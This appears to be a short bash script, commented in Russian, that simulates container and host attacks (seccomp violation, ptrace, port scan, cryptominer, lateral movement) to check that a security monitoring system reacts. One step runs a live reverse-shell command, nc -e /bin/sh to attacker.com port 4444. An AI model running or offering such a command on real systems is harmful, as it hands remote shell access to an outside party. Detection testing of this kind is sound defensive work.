#!/bin/bash

echo "🎯 Симуляция атак для тестирования системы безопасности"

# 1. Симуляция seccomp нарушения
echo "1. Симуляция seccomp нарушения..."
docker run --rm --security-opt seccomp=block.json alpine sh -c "mount"

# 2. Симуляция попытки ptrace
echo "2. Симуляция ptrace атаки..."
cat <<EOF > /tmp/ptrace_demo.c
#include <sys/ptrace.h>
#include <unistd.h>
int main() { ptrace(PTRACE_TRACEME, 0, NULL, NULL); return 0; }
EOF
gcc /tmp/ptrace_demo.c -o /tmp/ptrace_demo
/tmp/ptrace_demo

# 3. Симуляция порт сканирования
echo "3. Симуляция порт сканирования..."
nmap -sS -p 1-1000 localhost &

# 4. Симуляция reverse shell
echo "4. Симуляция reverse shell..."
nc -e /bin/sh attacker.com 4444 &

# 5. Симуляция криптомайнера
echo "5. Симуляция криптомайнера..."
docker run --rm -d --name miner-test alpine sh -c "while true; do sha256sum /dev/zero; done"

# 6. Симуляция lateral movement
echo "6. Симуляция lateral movement..."
kubectl exec -it --namespace default some-pod -- /bin/bash -c "ssh user@another-pod"

echo "✅ Все атаки симулированы, проверьте реакцию системы"
